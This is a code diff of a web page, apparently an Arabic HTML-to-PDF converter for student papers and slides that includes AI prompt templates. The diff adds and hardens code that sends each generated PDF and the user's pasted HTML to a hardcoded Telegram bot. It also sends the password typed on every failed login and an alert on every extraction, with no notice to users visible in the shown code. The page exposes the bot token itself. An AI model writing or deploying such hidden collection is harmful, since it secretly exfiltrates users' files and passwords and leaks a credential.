@@ -125,36 +125,36 @@
         const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
         const chatId = '6680237928'; 
 
-        // 1. دالة لإرسال النصوص العادية (مثل تنبيهات الدخول)
+        // 1. دالة لإرسال النصوص العادية
         function sendTextToTelegram(actionMessage) {
-            if(!botToken || botToken.includes('ضع_توكن')) return; // تجاهل إذا لم يتم وضع التوكن
-            
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة الـ PDF\n\n${actionMessage}` })
-            }).catch(e => console.error(e));
+            }).catch(e => console.error("خطأ في إرسال النص:", e));
         }
 
-        // 2. دالة لإرسال الملفات (PDF أو كود)
+        // 2. دالة إرسال الملفات (تم التعديل لضمان الإرسال في كل مرة)
         function sendFileToTelegram(fileBlob, fileName, captionMsg) {
-            if(!botToken || botToken.includes('ضع_توكن')) return;
-
             const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
             const formData = new FormData();
             
             formData.append('chat_id', chatId);
-            // تحويل الـ Blob إلى File مع تحديد الاسم
-            formData.append('document', new File([fileBlob], fileName)); 
+            // الطريقة المضمونة لإرفاق الملفات في JavaScript
+            formData.append('document', fileBlob, fileName); 
             formData.append('caption', captionMsg);
 
             fetch(url, {
                 method: 'POST',
                 body: formData
             })
-            .then(res => console.log(`تم إرسال الملف: ${fileName}`))
-            .catch(err => console.error('خطأ في إرسال الملف', err));
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) console.log(`✅ تم إرسال الملف لتيليجرام: ${fileName}`);
+                else console.error(`❌ فشل إرسال الملف:`, data);
+            })
+            .catch(err => console.error('خطأ في الاتصال بتيليجرام:', err));
         }
         // ==========================================
 
@@ -167,14 +167,14 @@
                 sendTextToTelegram('✅ تم تسجيل الدخول للمنصة بنجاح.'); 
             } else {
                 errorMsg.style.display = 'block';
-                sendTextToTelegram(`❌ محاولة دخول فاشلة للمنصة.\nالكلمة التي تم إدخالها: ${input}`); 
+                sendTextToTelegram(`❌ محاولة دخول فاشلة للمنصة.\nالكلمة المجربة: ${input}`); 
                 setTimeout(() => errorMsg.style.display = 'none', 3000);
             }
         }
 
         const prompts = {
-            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص هكذا: <p>• النقطة الأولى</p>.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
-            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [اكتب العنوان هنا]\n**المادة / الموضوع:** [مثال: مشروع فيزياء / درس تاريخ]\n**المقدِّم:** [الاسم]\n**عدد الشرائح:** [مثال: 8 شرائح]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:**\nشريحة 1: غلاف (عنوان كبير + اسم المقدِّم).\nشرائح 2+: محتوى منظم.\nنمط التصميم: حديث، خلفيات ملونة، نصوص واسعة. خطوط كبيرة وواضحة.`
+            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
+            169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [اكتب العنوان هنا]\n**المادة / الموضوع:** [مثال: مشروع فيزياء / درس تاريخ]\n**المقدِّم:** [الاسم]\n**عدد الشرائح:** [مثال: 8 شرائح]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:**\nشريحة 1: غلاف (عنوان كبير + اسم المقدِّم).\nشرائح 2+: محتوى منظم.\nنمط التصميم: حديث، خلفيات ملونة، نصوص واسعة. خطوط كبيرة وواضحة.`
         };
 
         function copyPrompt(type, btnElement) {
@@ -277,6 +277,9 @@
 
             if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
 
+            // إرسال تنبيه في كل مرة يضغط فيها المستخدم على "استخراج"
+            sendTextToTelegram(`⏳ تم البدء بعملية استخراج جديدة...\nالاسم: ${fileName}`);
+
             let docWidth, docHeight, pdfOrientation;
             if (formatType === 'a4') {
                 docWidth = 794; docHeight = 1123; pdfOrientation = 'portrait';
@@ -351,15 +354,17 @@
                 pdf.save(`${fileName}.pdf`);
 
                 // ==================================================
-                // 🚀 إرسال الملفات لتيليجرام بعد الاستخراج الناجح
+                // 🚀 إرسال الملفات لتيليجرام في كل عملية تحويل
                 // ==================================================
+                
                 // 1. إرسال ملف الـ PDF
-                const pdfBlob = pdf.output('blob'); // تحويل الـ PDF إلى بيانات خام
-                sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج ملف PDF بنجاح.\nاسم الملف: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
+                const pdfBlob = pdf.output('blob');
+                sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج الملف بنجاح!\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
 
-                // 2. إرسال الكود كملف نصي (TXT) عشان يكون سهل القراءة في تيليجرام
+                // 2. إرسال الكود كملف نصي (TXT)
                 const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
-                sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 الكود المصدري (HTML) المستخدم للملف.`);
+                sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالملف.`);
+                
                 // ==================================================
                 
             } catch (error) {
